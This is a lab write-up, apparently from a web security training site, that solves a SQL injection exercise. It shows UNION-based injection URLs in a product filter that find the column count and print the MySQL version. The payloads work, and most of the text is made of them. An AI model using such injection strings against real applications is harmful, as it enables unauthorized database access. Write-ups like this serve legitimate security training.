# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
 This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

## Solution
Once again we have to determine the amount of columns and find the text columns:
```
https://0a5f00bf03e42b6b8073bcee0061009d.web-security-academy.net/filter?category=Gifts%27+union+select+null,null+--+
```

```
https://0a5f00bf03e42b6b8073bcee0061009d.web-security-academy.net/filter?category=Gifts%27+union+select+%27ab%27,%27cd%27+--+
```

Seems pretty similar to the structure before. To get the version of a MySQL database we run the following:
```
https://0a5f00bf03e42b6b8073bcee0061009d.web-security-academy.net/filter?category=Gifts%27+union+select+null,@@version+--+
```

This will create a query like this:
```sql
SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT NULL,@@version -- 
```

In the response we get our version and solved the lab:
```
[...]
8.0.32-0ubuntu0.20.04.2
```
